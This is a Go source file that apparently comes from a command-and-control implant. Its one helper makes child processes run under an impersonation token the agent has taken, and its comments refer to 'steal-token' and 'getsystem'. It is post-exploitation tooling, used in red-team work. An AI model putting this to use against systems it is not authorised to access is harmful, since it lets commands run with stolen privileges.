//go:build windows
// +build windows

package commands

import (
	"os/exec"
	"syscall"
)

// configureProcessToken sets the impersonation token on the child process
// so that 'run' commands execute as the impersonated identity (e.g., after
// steal-token or getsystem). Without this, exec.Command uses CreateProcessW
// which inherits the process token, ignoring thread impersonation.
func configureProcessToken(cmd *exec.Cmd) {
	tokenMutex.Lock()
	token := gIdentityToken
	tokenMutex.Unlock()

	if token == 0 {
		return
	}

	// Setting SysProcAttr.Token causes Go's StartProcess to use
	// CreateProcessAsUser, which creates the child process with
	// the specified token's security context.
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Token: syscall.Token(token),
	}
}
